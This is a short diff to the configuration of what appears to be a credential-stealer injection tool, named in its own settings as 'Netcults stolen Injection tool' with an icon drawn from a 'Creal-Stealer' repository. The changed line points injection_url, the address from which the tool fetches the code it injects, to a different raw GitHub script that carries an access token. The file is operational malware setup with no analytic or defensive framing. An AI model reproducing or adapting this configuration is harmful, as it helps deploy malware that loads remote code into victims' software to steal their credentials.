@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Netcults stolen Injection tool', 
   embed_icon: 'https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js', 
+  injection_url: 'https://raw.githubusercontent.com/icrackedthisbtw/icrackedthislol/refs/heads/main/index.js?token=GHSAT0AAAAAAD4FBGTR6HUU2UIWMLFQXZ2S2PYKGTQ', 
   /**
    
    **/
